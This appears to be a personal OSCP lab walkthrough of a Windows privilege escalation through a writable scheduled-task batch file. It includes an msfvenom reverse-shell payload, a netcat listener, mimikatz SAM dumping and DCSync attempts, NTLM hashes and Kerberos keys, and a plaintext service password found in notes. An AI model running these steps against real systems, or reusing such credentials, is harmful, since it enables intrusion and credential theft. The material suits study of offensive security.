there is an automation task  that runs task.bat

```
*Evil-WinRM* PS C:\Tasks> cat automation
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-10-09T17:08:15</Date>
    <Author>WS26\Administrator</Author>
    <URI>\Automation</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-10-09T17:08:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\cmd.exe</Command>
      <Arguments>/c C:\Windows\Logs\task.bat</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>

```

```
*Evil-WinRM* PS C:\Windows\Logs> icacls C:\Windows\Logs\task.bat
C:\Windows\Logs\task.bat Everyone:(RX,W)
                         NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         WS26\Administrator:(F)

```


Create the shell 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.114 LPORT=1234 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
                                                                               
┌──(kali㉿kali)-[~/OSCP/Exam/AD/192.168.114.206]
└─$ ls
adPEAS  results  rev.exe  shell.exe  task.bat  winpeas  winPEASx64.exe

```

Uploaded the shell 

```
Evil-WinRM* PS C:\Windows\Logs> ls


    Directory: C:\Windows\Logs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/12/2024   4:52 AM                CBS
d-----         10/9/2024   3:10 PM                DISM
d-----         10/9/2024   4:02 PM                DPX
d---s-          5/6/2022  10:24 PM                MeasuredBoot
d-----         10/9/2024   2:33 PM                MoSetup
d-----         10/9/2024   2:44 PM                NetSetup
d-----         10/9/2024   2:24 PM                SetupCleanupTask
d-----        11/12/2024   4:54 AM                SIH
d-----        11/12/2024   4:54 AM                SystemRestore
d-----          5/6/2022  10:24 PM                Telephony
d-----        11/12/2024   5:55 AM                waasmedic
d-----          6/8/2025   7:10 PM                waasmediccapsule
d-----          6/8/2025   7:10 PM                WindowsUpdate
d-----         10/9/2024   2:30 PM                WinREAgent
-a----        11/12/2024   8:19 AM          73802 rev.exe
-a----        11/12/2024   8:20 AM             52 shell.bat
-a----        11/12/2024   8:27 AM           7168 shell.exe
-a----        11/12/2024   8:20 AM             52 task.bat


*Evil-WinRM* PS C:\Windows\Logs> Invoke-WebRequest -uri http://192.168.49.114:8080/task.bat -OutFile task.bat
*Evil-WinRM* PS C:\Windows\Logs> ls


    Directory: C:\Windows\Logs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/12/2024   4:52 AM                CBS
d-----         10/9/2024   3:10 PM                DISM
d-----         10/9/2024   4:02 PM                DPX
d---s-          5/6/2022  10:24 PM                MeasuredBoot
d-----         10/9/2024   2:33 PM                MoSetup
d-----         10/9/2024   2:44 PM                NetSetup
d-----         10/9/2024   2:24 PM                SetupCleanupTask
d-----        11/12/2024   4:54 AM                SIH
d-----        11/12/2024   4:54 AM                SystemRestore
d-----          5/6/2022  10:24 PM                Telephony
d-----        11/12/2024   5:55 AM                waasmedic
d-----          6/8/2025   7:10 PM                waasmediccapsule
d-----          6/8/2025   7:10 PM                WindowsUpdate
d-----         10/9/2024   2:30 PM                WinREAgent
-a----        11/12/2024   8:19 AM          73802 rev.exe
-a----        11/12/2024   8:20 AM             52 shell.bat
-a----        11/12/2024   8:27 AM           7168 shell.exe
-a----        11/12/2024   8:41 AM           1587 task.bat


*Evil-WinRM* PS C:\Windows\Logs> 

```


# listening 
```
┌──(kali㉿kali)-[~/OSCP/Exam/AD/192.168.114.206]
└─$ nc -lvnp 4000
listening on [any] 4000 ...
connect to [192.168.49.114] from (UNKNOWN) [192.168.114.206] 58488
Microsoft Windows [Version 10.0.22631.4317]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>

```

am i in 
```

C:\Windows\System32>whoami
whoami
ws26\administrator

C:\Windows\System32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                         
================== ============================================
ws26\administrator S-1-5-21-2756297892-2186407355-380279769-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                                     
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

C:\Windows\System32>

```

```
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
bfd1a2d862df5e72259e47dd14d2a826

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.114.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.114.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.114.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Users\Administrator\Desktop>whoami
whoami
ws26\administrator

```

![[{81211A5E-7158-4D53-85A0-B5525CCD83EB}.png]]


# mimikatz

```
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

712     {0;000003e7} 1 D 43468          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00c70520} 0 D 13069196    WS26\Administrator      S-1-5-21-2756297892-2186407355-380279769-500(14g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 13120806    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # lsadump::sam
Domain : WS26
SysKey : 6efca182500dc518f4c19cf5341a30d4
Local SID : S-1-5-21-2756297892-2186407355-380279769

SAMKey : 24426470f121aa90530be4b3c19d878b

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 53543e641a6f55819e487a9dc990f59b
    lm  - 0: 0ea9a0c3dcc221c333185aaec9566872
    ntlm- 0: 53543e641a6f55819e487a9dc990f59b
    ntlm- 1: 53543e641a6f55819e487a9dc990f59b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9c15a529d326adc5c199eaa2199580b6

* Primary:Kerberos-Newer-Keys *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ec04efd7359ded3e04e10c830e8a8e66abf5f2197f6e98f9a2e984287ac10dd1
      aes128_hmac       (4096) : de1b2ef8e7c101262f67e685bf338711
      des_cbc_md5       (4096) : 40c870dc86642683
    OldCredentials
      aes256_hmac       (4096) : 35a352f16e83cbe30527c094b93892d1fcbe2f829d38b1e1cc8346b9772b155b
      aes128_hmac       (4096) : fedd319fd0f366466c500d53b0305efc
      des_cbc_md5       (4096) : 6da13d317fc84316
    OlderCredentials
      aes256_hmac       (4096) : 53c7cdd42d708d6ec10e1c7814c62167bad6454ea6dc42d9e5c1bb8ab7b9d79d
      aes128_hmac       (4096) : ea7898e7e9d3e319005056b9e5f7dd43
      des_cbc_md5       (4096) : 91ce9dab57548f0b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Credentials
      des_cbc_md5       : 40c870dc86642683
    OldCredentials
      des_cbc_md5       : 6da13d317fc84316


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5403e400be738dd915e176be5da78216

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : aedf7c3484786b0b08c3cf5390100e59

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fde783dddc7dba274cdb578e91c742114e263fda3f85d2de370b2094d1de0bc0
      aes128_hmac       (4096) : ded4018116eea7e5616be59ae6ffe2e2
      des_cbc_md5       (4096) : eca497e5c275648c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : eca497e5c275648c


mimikatz # lsadump::dcsync /user:krbtgt
[DC] 'oscp.exam' will be the domain
[DC] 'DC20.oscp.exam' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)

mimikatz # 

```

User : Administrator
  Hash NTLM: 53543e641a6f55819e487a9dc990f59b


inside document. simple stikcy notes
```
PS C:\Users\Administrator\Documents\Simple Sticky Notes> type notes.db
type notes.db
SQLite format 3@  .zp



?

?!11?AtableNOTEBOOKSNOTEBOOKSCREATE TABLE NOTEBOOKS (ID INTEGER,NAME TEXT)+`!!!?tableNOTESNOTESCREATE TABLE NOTES (ID INTEGER,STATE INTEGER,CREATED FLOAT,UPDATED FLOAT,DELETED FLOAT,STARRED INTEGER,AOT INTEGER,MINIMIZE INTEGER,COLOR INTEGER,OPACITY INTEGER,LEFT INTEGER,TOP INTEGER,WIDTH INTEGER,HEIGHT INTEGER,LOCKED INTEGER,ZORDER INTEGER,ALARM FLOAT,ALARM_CURRENT FLOAT,ALARM_PERIOD INTEGER,ALARM_DAY INTEGER,ALARM_SNOOZE INTEGER,ALARM_SOUND TEXT,NOTEBOOK TEXT,TITLE TEXT,TYPE INTEGER,DATA BLOB,TEXT TEXT)


.j              
.T,y@�@<�_�@�@Dq�3T��d
                      OddoriNew Note{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Segoe UI;}}
{\*\generator Riched20 10.0.22621}\viewkind4\uc1 
\pard\f0\fs24 ToDo\par
\par
- SQL server needs to be updated\par
\par
- Disable SQL xp_cmdshell as it's a security risk\par
\par
- Temp creds for SQL testing\par
\par
svc_sql : SQLPowerHouse333\par
}
ToDo



- SQL server needs to be updated



- Disable SQL xp_cmdshell as it's a security risk



- Temp creds for SQL testing



svc_sql : SQLPowerHouse333
oo              ori
```

from this we know the 
username: svc_sql
password: SQLPowerHouse333

crackmapexec mssql 172.16.114.202 -u svc_sql -p SQLPoworiouse333 -d oscp.exam